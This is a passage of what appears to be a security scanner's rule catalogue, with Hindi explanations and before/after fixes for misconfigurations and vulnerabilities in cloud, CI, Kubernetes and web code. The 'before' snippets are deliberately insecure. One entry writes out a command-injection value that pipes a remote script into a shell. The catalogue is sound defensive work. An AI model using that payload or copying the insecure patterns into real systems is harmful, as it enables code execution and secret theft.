      'किसी ऐसे नियम में "cidr_blocks" जिसमें 0.0.0.0/0 (कोई भी IP पता) शामिल हो, किसी संवेदनशील पोर्ट के पास है — SSH (22), RDP (3389), या कोई आम डेटाबेस पोर्ट (MySQL, Postgres, MongoDB, Redis, SQL Server)। इंटरनेट पर कोई भी उस सेवा से जुड़ने की कोशिश कर सकता है, न कि सिर्फ़ वे लोग जिन्हें यह अनुमति होनी चाहिए।',
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # सिर्फ़ आपका प्राइवेट नेटवर्क, या कोई bastion host\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "एक Google Cloud फ़ायरवॉल नियम पूरे इंटरनेट के लिए एक संवेदनशील पोर्ट खोल देता है",
    description:
      'किसी "google_compute_firewall" रिसोर्स का "source_ranges" जिसमें 0.0.0.0/0 (कोई भी IP पता) शामिल हो, किसी संवेदनशील पोर्ट के लिए ट्रैफ़िक की अनुमति देता है — SSH (22), RDP (3389), या कोई आम डेटाबेस पोर्ट (MySQL, Postgres, MongoDB, Redis, SQL Server)। इंटरनेट पर कोई भी उस सेवा से जुड़ने की कोशिश कर सकता है, न कि सिर्फ़ वे लोग जिन्हें यह अनुमति होनी चाहिए।',
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # सिर्फ़ आपका प्राइवेट नेटवर्क, या कोई bastion host\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "एक Azure नेटवर्क नियम पूरे इंटरनेट के लिए एक संवेदनशील पोर्ट खोल देता है",
    description:
      'कोई नेटवर्क सिक्योरिटी रूल ("azurerm_network_security_rule", या "azurerm_network_security_group" के अंदर "security_rule" ब्लॉक) जिसका "source_address_prefix" "*" या "0.0.0.0/0" हो, दिशा "Inbound" और एक्सेस "Allow" हो, किसी संवेदनशील पोर्ट के पास हो — SSH (22), RDP (3389), या कोई आम डेटाबेस पोर्ट। इंटरनेट पर कोई भी उस सेवा से जुड़ने की कोशिश कर सकता है, न कि सिर्फ़ वे लोग जिन्हें यह अनुमति होनी चाहिए।',
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # सिर्फ़ आपका प्राइवेट नेटवर्क, या कोई bastion host\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "एक Terraform वेरिएबल के डिफ़ॉल्ट वैल्यू के रूप में एक सीक्रेट लिखा है",
    description:
      'password/secret/token/key जैसे नाम वाले किसी वेरिएबल की उसके "default" में एक लिटरल वैल्यू है। रनटाइम पर पास की गई वैल्यू (tfvars, TF_VAR_* एनवायरनमेंट वेरिएबल) के उलट, डिफ़ॉल्ट सोर्स कोड में ही पहुँच जाता है — और अगर रिपॉज़िटरी शेयर्ड या पब्लिक है, तो कोई भी इसे देख सकता है, भले ही उसके पास Terraform स्टेट का एक्सेस न हो।',
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # कोई डिफ़ॉल्ट नहीं: इसे .tfvars फ़ाइल (git से बाहर) या TF_VAR_db_password एनवायरनमेंट वेरिएबल से पास करें\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "किसी बाहरी उपयोगकर्ता द्वारा नियंत्रित वैल्यू सीधे CI के शेल कमांड में पहुँच जाती है",
    description:
      'GitHub Actions वर्कफ़्लो का कोई "run:" कमांड pull request के टाइटल, ब्रांच के नाम, या किसी कमेंट के टेक्स्ट जैसी वैल्यू को सीधे इंटरपोलेट करता है — ये सब कोई भी लिख सकता है जो pull request या कमेंट खोलता है, यहाँ तक कि किसी बाहरी fork से भी। `"; curl malware.sh | sh #` जैसी वैल्यू उस वर्कफ़्लो में उपलब्ध हर सीक्रेट तक पहुँच के साथ CI में मनमाने कमांड चला देती।',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # एनवायरनमेंट वेरिएबल की तरह पास किया गया, कभी भी सीधे कमांड में इंटरपोलेट नहीं किया गया`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "वर्कफ़्लो रिपॉज़िटरी के सीक्रेट्स के एक्सेस के साथ किसी बाहरी pull request का कोड चलाता है",
    description:
      'वर्कफ़्लो "pull_request_target" का इस्तेमाल करता है — जो किसी असंबंधित fork से खोली गई pull request के लिए भी बेस रिपॉज़िटरी की परमिशन और सीक्रेट्स के साथ चलता है — और बेस ब्रांच के बजाय खुद pull request के कोड ("github.event.pull_request.head") का चेकआउट करता है। pull request खोलने वाला व्यक्ति इस तरह अपना ही कोड उन सीक्रेट्स के एक्सेस के साथ चलवा लेता है।',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # बेस ब्रांच का चेकआउट करें, PR के कोड का नहीं — या अगर व्यापक\n      # परमिशन/सीक्रेट्स की ज़रूरत न हो तो "pull_request_target" के बजाय\n      # "pull_request" इस्तेमाल करें।\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "अनुरोध का डेटा ऐसे फ़ॉर्मेट में deserialize किया जा रहा है जो कोड चला सकता है",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java), या node-serialize लाइब्रेरी (Node) अनुरोध से सीधे ली गई किसी वैल्यू को deserialize कर रहे हैं। JSON के उलट, ये फ़ॉर्मेट deserialization के दौरान ही कोड को रिप्रेज़ेंट और चला सकते हैं — भेजी गई वैल्यू को कंट्रोल करने वाला व्यक्ति सर्वर पर मनमाना कोड एग्ज़िक्यूशन हासिल कर सकता है।",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # pickle के उलट, JSON पार्सिंग के दौरान कभी कोड नहीं चलाता`,
    },
  },
  "jwt-none-algorithm": {
    title: 'कोड साफ़ तौर पर बिना साइन किए JWT टोकन स्वीकार करता है ("none" एल्गोरिद्म)',
    description:
      'JWT टोकन वेरिफ़ाई करने के लिए स्वीकार किए गए एल्गोरिद्म में "none" शामिल है। "none" एल्गोरिद्म वाले टोकन में वेरिफ़ाई करने के लिए कोई सिग्नेचर ही नहीं होता: कोई भी किसी भी कंटेंट (जैसे एडमिन रोल) के साथ ऐसा टोकन बना सकता है, और कोड उसे वैध मान लेगा।',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // स्वीकार किए गए एल्गोरिद्म में "none" को कभी शामिल न करें`,
    },
  },
  "unprotected-new-table": {
    title: "एक नई टेबल बिना किसी सुरक्षा के बनाई जा रही लगती है",
    description:
      "एक SQL माइग्रेशन एक टेबल बनाता है, लेकिन उसी फ़ाइल में उस टेबल के लिए Row Level Security चालू नहीं करता। जब तक यह ऐसे ही रहता है, टेबल बिना किसी पाबंदी के शुरू होती है कि इसे कौन पढ़ या लिख सकता है।",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "साइट किसी भी दूसरी वेबसाइट से अनुरोध स्वीकार कर लेती है",
    description:
      "CORS हेडर किसी भी ओरिजिन (*) से अनुरोध स्वीकार करने के लिए सेट है, या cors() मिडलवेयर बिना किसी पाबंदी के इस्तेमाल किया जा रहा है। कोई भी थर्ड-पार्टी वेबसाइट पहले से लॉग-इन उपयोगकर्ता के ब्राउज़र से आपके API कॉल कर सकती है।",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "एडमिन परमिशन वाला एक फ़ंक्शन यह नहीं जाँचता कि इसे कौन इस्तेमाल कर रहा है",
    description:
      "कोई रूट या फ़ंक्शन जिसका नाम एडमिन ऑपरेशन का संकेत देता है, आसपास की लाइनों में कोई ऑथेंटिकेशन या रोल जाँच नहीं रखता। जो भी URL जानता है वह इसे चला सकता है।",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "साइट को बाहरी कोड चलाने के लिए मजबूर किया जा सकता है",
    description:
      "कोई आउटगोइंग HTTP अनुरोध (fetch, axios) किसी उपयोगकर्ता के अनुरोध से आई वैल्यू को सीधे डेस्टिनेशन URL की तरह इस्तेमाल करता है। कोई दुर्भावनापूर्ण उपयोगकर्ता आपके सर्वर को इंटरनल या मनमाने पते कॉल करवा सकता है — Server-Side Request Forgery।",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL not allowed")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "पासवर्ड को अब आसानी से तोड़े जा सकने वाले तरीके से सुरक्षित किया गया है",
    description:
      "उसी लाइन में, md5() या sha1() किसी पासवर्ड से जुड़ी वैल्यू पर लागू किए जाते हैं। ये एल्गोरिद्म हिसाब लगाने में बहुत तेज़ हैं: डेटाबेस हासिल कर चुका हमलावर प्रति सेकंड अरबों पासवर्ड आज़मा सकता है।",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "xss-dangerous-html": {
    title: "उपयोगकर्ताओं द्वारा लिखा गया टेक्स्ट ब्राउज़र में कोड चला सकता है",
    description:
      "कंटेंट को प्लेन टेक्स्ट के बजाय रॉ HTML के रूप में पेज में डाला जाता है (dangerouslySetInnerHTML, v-html, .innerHTML)। अगर इस कंटेंट में उपयोगकर्ता का इनपुट शामिल है, तो इसमें ऐसे स्क्रिप्ट हो सकते हैं जो पेज पढ़ने वाले के ब्राउज़र में चल जाएँ।",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// या, अगर HTML ज़रूरी हो तो: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "अपलोड की गई फ़ाइलों की जगह किसी को भी दिखती है",
    description:
      "कोई storage bucket (Supabase Storage, S3) पब्लिक के रूप में कॉन्फ़िगर किया गया है। अगर इसमें उपयोगकर्ताओं द्वारा अपलोड किए दस्तावेज़, फ़ोटो या फ़ाइलें हैं, तो जो भी रास्ता जानता है — या अंदाज़ा लगा लेता है — वह बिना ऑथेंटिकेशन के उन्हें एक्सेस कर सकता है।",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// फ़ाइलें समय-सीमित साइन की गई URL से दें: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "डेटा डिलीट या बदलने के लिए एक ही लिंक काफ़ी है",
    description:
      "कोई GET रूट ऐसा ऑपरेशन करता है जो डेटा बदल देता है (पाथ में delete/remove/update/edit शामिल है)। GET अनुरोध सिर्फ़ किसी लिंक पर जाने या किसी बाहरी साइट से इमेज लोड होने भर से चल जाते हैं — यह CSRF हमले का क्लासिक ज़रिया है।",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "ब्राउज़र में सेव किया गया लॉगिन डेटा अच्छी तरह सुरक्षित नहीं है",
    description:
      "एक एक्सेस टोकन localStorage में सेव किया जाता है। httpOnly कुकी के उलट, पेज पर चल रहा कोई भी स्क्रिप्ट (XSS से इंजेक्ट किए गए दुर्भावनापूर्ण स्क्रिप्ट सहित) इसे पढ़ और चुरा सकता है।",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// टोकन को सर्वर से httpOnly कुकी की तरह सेट करें:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "साइट का इस्तेमाल किसी फ़र्ज़ी वेबसाइट पर रीडायरेक्ट करने के लिए किया जा सकता है",
    description:
      "साइट उपयोगकर्ता को बिना यह जाँचे कि यह कोई जाना-पहचाना डोमेन है, अनुरोध (query, body, params) से सीधे लिए गए पते पर रीडायरेक्ट कर देती है। आपकी साइट की ओर इशारा करता दिखने वाला लिंक असल में किसी फ़िशिंग पेज पर ले जा सकता है।",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "पते में एक नंबर बदलने से किसी और का डेटा दिख सकता है",
    description:
      "एक डेटाबेस क्वेरी बिना आसपास की लाइनों में यह जाँचे कि वह अनुरोध करने वाले उपयोगकर्ता का ही है, URL से लिए गए पहचानकर्ता (req.params.id) का सीधे इस्तेमाल करती है। पते में id बदलने से किसी और उपयोगकर्ता के डेटा तक पहुँच मिल सकती है — Insecure Direct Object Reference।",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "header-injection": {
    title: "अनुरोध की एक वैल्यू सीधे HTTP रिस्पॉन्स हेडर में पहुँच जाती है",
    description:
      "एक HTTP रिस्पॉन्स हेडर को बिना यह जाँचे कि उसमें कोई लाइन ब्रेक (CRLF) तो नहीं है, अनुरोध (query, body, params) से सीधे ली गई वैल्यू से सेट किया जाता है। हमलावर अतिरिक्त हेडर, या यहाँ तक कि पूरी तरह अलग रिस्पॉन्स भी डाल सकता है — response splitting — जिससे कैशिंग, कुकीज़, या दूसरे उपयोगकर्ताओं को दिखने वाला कंटेंट प्रभावित हो सकता है।",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "docker-missing-user": {
    title: "Dockerfile कोई non-root उपयोगकर्ता सेट नहीं करती",
    description:
      "Dockerfile में कोई USER इंस्ट्रक्शन नहीं है: इसके बिना, कंटेनर root के रूप में चलता है। अगर हमलावर कंटेनर के अंदर कोड चलाने में कामयाब हो जाए (जैसे किसी कमज़ोर लाइब्रेरी का फ़ायदा उठाकर), तो कंटेनर के अंदर root होना होस्ट तक पहुँच — या आसपास के सिस्टम पर व्यापक असर — आसान बना देता है।",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Kubernetes मैनिफ़ेस्ट साफ़ तौर पर non-root उपयोगकर्ता के रूप में चलना लागू नहीं करता",
    description:
      'मैनिफ़ेस्ट में कहीं भी (न तो pod स्तर पर, न ही कंटेनर स्तर पर) "runAsNonRoot" नहीं है: इसे सेट किए बिना, कंटेनर वही उपयोगकर्ता बनकर चलता है जो उसकी इमेज डिफ़ाइन करती है — अक्सर डिफ़ॉल्ट रूप से root, अगर खुद इमेज ने इसे न बदला हो। इसे साफ़ तौर पर true सेट करने पर, अगर इमेज फिर भी root के रूप में चलने की कोशिश करे तो pod शुरू होने में फ़ेल हो जाता है, न कि किसी घटना के बाद ही इसका पता चले।',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "gha-unpinned-action": {
    title: "CI में थर्ड-पार्टी action किसी सटीक वर्शन (commit SHA) पर पिन नहीं है",
    description:
      'वर्कफ़्लो किसी थर्ड-पार्टी action को commit SHA के बजाय टैग या ब्रांच से रेफ़र करता है (जैसे "@v1", "@main")। इसे मेंटेन करने वाला — या उसका अकाउंट हैक करने वाला — कभी भी उस रेफ़रेंस को किसी दूसरे कमिट पर ले जा सकता है, और चुपचाप यह बदल सकता है कि CI में क्या चल रहा है, उसके सीक्रेट्स के एक्सेस के साथ। एक commit SHA हमेशा बिल्कुल उसी कोड की ओर इशारा करता है।',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, commit SHA पर पिन किया गया — वर्शन अपडेट करने पर SHA भी अपडेट करें`,
    },
  },
  "gha-excessive-permissions": {
    title: "वर्कफ़्लो सिर्फ़ इस्तेमाल होने वाली परमिशन के बजाय टोकन की सारी परमिशन खुद को दे देता है",
    description:
      '"permissions: write-all" वर्कफ़्लो के GITHUB_TOKEN को हर चीज़ पर राइट एक्सेस दे देता है — issues, pull requests, पैकेज, डिप्लॉयमेंट — भले ही वर्कफ़्लो इनमें से कुछ ही इस्तेमाल करता हो। अगर वर्कफ़्लो का कोई स्टेप हैक हो जाए (कोई दुर्भावनापूर्ण डिपेंडेंसी, इंजेक्ट किया गया स्क्रिप्ट), तो ये व्यापक परमिशन इस बात का दायरा बढ़ा देती हैं कि हमलावर क्या कर सकता है।',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # सिर्फ़ वही परमिशन जो वर्कफ़्लो वाकई इस्तेमाल करता है`,
    },
  },
  "insecure-cookie-flags": {
    title: "कोई सेशन या ऑथेंटिकेशन कुकी बिना Secure और HttpOnly फ़्लैग के सेट की गई है",
    description:
      'session/auth/token जैसे नाम वाली कोई कुकी अपने ऑप्शन में "httpOnly" और "secure" के बिना सेट की गई है। httpOnly के बिना, पेज पर चल रहा कोई भी JavaScript (XSS से इंजेक्ट किया गया कोड भी) उस कुकी को पढ़ सकता है। secure के बिना, इसे बिना एन्क्रिप्ट किए HTTP कनेक्शन पर भी भेजा जा सकता है।',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "no-login-rate-limit": {
    title: "लॉगिन फ़ॉर्म लगातार कई कोशिशों को नहीं रोकता",
    description:
      "फ़ाइल में एक लॉगिन रूट डिफ़ाइन है, लेकिन उसी फ़ाइल में rate-limiting मिडलवेयर का कोई निशान नहीं है। कोशिशों की कोई सीमा न होने पर, हमलावर बिना रोक-टोक के लगातार पासवर्ड आज़मा सकता है (brute force)।",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "पासवर्ड या संवेदनशील डेटा लॉग में पहुँच जाता है",
    description:
      "console.log (या इसी तरह का) कॉल में password, token, secret या apiKey नाम का कोई वेरिएबल शामिल है। अगर ये लॉग किसी बाहरी सेवा या फ़ाइल में पहुँच जाएँ, तो संवेदनशील डेटा ज़रूरत से कहीं ज़्यादा देर तक उजागर रहता है।",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "k8s-run-as-root": {
    title: "Kubernetes मैनिफ़ेस्ट में एक कंटेनर root के रूप में चलने के लिए सेट है",
    description:
      'securityContext में "runAsUser: 0" या "runAsNonRoot: false" साफ़ तौर पर कंटेनर को root के रूप में चलने के लिए मजबूर करते हैं। अगर हमलावर कंटेनर के अंदर कोड चलाने में कामयाब हो जाए (जैसे किसी कमज़ोर लाइब्रेरी का फ़ायदा उठाकर), तो कंटेनर के अंदर root होना होस्ट तक पहुँच — या व्यापक असर — आसान बना देता है।',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Kubernetes मैनिफ़ेस्ट में एक कंटेनर शुरुआत से ज़्यादा प्रिविलेज पा सकता है",
    description:
      'securityContext में "allowPrivilegeEscalation: true" कंटेनर के अंदर किसी प्रोसेस को उसे शुरू करने वाले प्रोसेस से ज़्यादा प्रिविलेज पाने देता है (जैसे किसी setuid बाइनरी के ज़रिए)। ऐप में किसी कमज़ोरी के साथ मिलकर, यह इच्छा से ज़्यादा प्रिविलेज के साथ कोड चलाने की दिशा में एक और कदम है।',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Kubernetes मैनिफ़ेस्ट में एक pod होस्ट का नेटवर्क, प्रोसेस या शेयर्ड मेमोरी शेयर करता है",
    description:
      '"hostNetwork", "hostPID" या "hostIPC" को true सेट करने से pod अपनी सामान्य आइसोलेशन से बाहर आ जाता है: hostNetwork pod को होस्ट के नेटवर्क पर उजागर करता है (क्लस्टर की नेटवर्क पॉलिसी बायपास करके), hostPID इसे होस्ट मशीन पर चल रहे हर प्रोसेस की जानकारी देता है, hostIPC इसे होस्ट की शेयर्ड मेमोरी तक एक्सेस देता है। सामान्य ऐप के लिए यह लगभग कभी ज़रूरी नहीं होता — आमतौर पर सिर्फ़ लो-लेवल सिस्टम/मॉनिटरिंग टूल के लिए ही होता है।',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Terraform में डिफ़ाइन किए गए S3 bucket पर Block Public Access बंद है",
    description:
      '"aws_s3_bucket_public_access_block" की चार सुरक्षाओं (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) में से एक या ज़्यादा false पर सेट हैं। इसका मतलब यह नहीं कि bucket पहले से पब्लिक है, लेकिन यह एक सेफ़्टी नेट हटा देता है जो इसे भविष्य में गलती से पब्लिक होने से रोकता।',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "Terraform में डिफ़ाइन की गई एक IAM पॉलिसी पूरा एक्सेस दे देती है",
    description:
      'action "*" और resource "*" वाला एक statement हर AWS सेवा और रिसोर्स का पूरा एक्सेस दे देता है — यह वही जाँच है जो पहले से लाइव IAM स्टेट पर की जाती है, यहाँ सीधे कोड से पढ़ी जा रही है, लागू होने से भी पहले। यह किसी इमरजेंसी रोल के लिए जानबूझकर किया गया हो सकता है, लेकिन इसे पक्का करना चाहिए: रोज़मर्रा के इस्तेमाल के लिए सिर्फ़ वही परमिशन दें जो वाकई ज़रूरी हो।',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "एक Google Cloud Storage bucket को किसी के भी पढ़ने लायक बना दिया गया है",
    description:
      '"google_storage_bucket_iam_member" या "google_storage_bucket_iam_binding" रिसोर्स "allUsers" या "allAuthenticatedUsers" को कोई रोल दे देता है — पहला bucket को बिना किसी Google अकाउंट के भी इंटरनेट पर किसी के भी पढ़ने लायक बना देता है; दूसरा किसी भी Google अकाउंट वाले व्यक्ति के लिए, न कि सिर्फ़ उनके लिए जिन्हें एक्सेस होना चाहिए।',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # सिर्फ़ वही जिसे वाकई एक्सेस होना चाहिए, न कि allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "Azure स्टोरेज अकाउंट पर पब्लिक blob एक्सेस चालू है",
    description:
      '"azurerm_storage_account" पर "allow_blob_public_access" true सेट है: पब्लिक किए गए blob/container का URL जानने वाला कोई भी व्यक्ति बिना किसी ऑथेंटिकेशन के इसे पढ़ सकता है।',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "एक Google Cloud IAM रोल पूरा एक्सेस दे देता है (Owner/Editor)",
    description:
      '"google_project_iam_binding"/"google_project_iam_member" (या ऑर्गनाइज़ेशन/फ़ोल्डर स्तर पर इसके बराबर) "roles/owner" या "roles/editor" जैसा प्रिमिटिव रोल असाइन करता है — प्रोजेक्ट की लगभग हर सेवा का लगभग पूरा एक्सेस। यह किसी इमरजेंसी अकाउंट के लिए जानबूझकर किया गया हो सकता है, लेकिन इसे पक्का करना चाहिए: रोज़मर्रा के इस्तेमाल के लिए सिर्फ़ वही ज़्यादा सटीक, प्रीडिफ़ाइंड रोल दें जो वाकई ज़रूरी हों।',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # सिर्फ़ वही प्रीडिफ़ाइंड रोल जो वाकई ज़रूरी हो, न कि roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "एक Azure रोल असाइनमेंट पूरा एक्सेस दे देता है (Owner)",
    description:
      'एक "azurerm_role_assignment" "Owner" रोल असाइन करता है — दूसरे उपयोगकर्ताओं की परमिशन पर कंट्रोल सहित, पूरे असाइन किए गए scope (सब्सक्रिप्शन, रिसोर्स ग्रुप...) पर पूरा एक्सेस। यह किसी इमरजेंसी अकाउंट के लिए जानबूझकर किया गया हो सकता है, लेकिन इसे पक्का करना चाहिए: रोज़मर्रा के इस्तेमाल के लिए सिर्फ़ वही ज़्यादा सटीक रोल दें जो वाकई ज़रूरी हो (जैसे किसी एक रिसोर्स ग्रुप पर "Contributor")।',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # सिर्फ़ वही ज़्यादा सटीक रोल जो वाकई ज़रूरी हो, न कि पूरी सब्सक्रिप्शन पर Owner\n}`,
    },
  },
  "weak-random-token": {
    title: "एक सिक्योरिटी टोकन ऐसे रैंडम नंबर जनरेटर से बनाया गया है जो क्रिप्टोग्राफ़िकली सुरक्षित नहीं है",
    description:
      "token/session/reset/otp/csrf जैसे नाम वाली कोई वैल्यू Math.random() (JS), random.random() (Python), या rand() (PHP) से बनाई जाती है — ये जनरेटर सिक्योरिटी के लिए डिज़ाइन नहीं किए गए, जिनके सीक्वेंस अनुमानित होते हैं। इस तरह बनाया गया टोकन अंदाज़ा लगाकर या दोबारा बनाकर निकाला जा सकता है, जिससे वह मकसद ही बेकार हो जाता है जिसके लिए यह बनाया गया था (जैसे पासवर्ड रीसेट लिंक, जिसे कोई भी अंदाज़ा लगा सकता हो)।",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // Math.random नहीं, crypto — जिसका अंदाज़ा नहीं लगाया जा सकता`,
    },
  },
  "ldap-injection": {
    title: "एक LDAP फ़िल्टर अनुरोध की वैल्यू को सीधे जोड़कर बनाया गया है",
    description:
      'LDAP फ़िल्टर बनाने वाली एक लाइन (जैसे "(uid=...)") बिना LDAP के विशेष कैरेक्टर को escape किए, अनुरोध से ली गई वैल्यू को सीधे शामिल करती है। इस वैल्यू को कंट्रोल करने वाला व्यक्ति फ़िल्टर का लॉजिक बदल सकता है — जैसे किसी ऑथेंटिकेशन जाँच को बायपास करना, या डायरेक्टरी का ऐसा डेटा पढ़ना जो उसे नहीं देखना चाहिए।',
    fix: {
      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // फ़िल्टर में इस्तेमाल करने से पहले LDAP के विशेष कैरेक्टर को हमेशा escape करना चाहिए\nclient.search(base, { filter });`,
    },
  },
  "vulnerable-dependency": (original) => ({
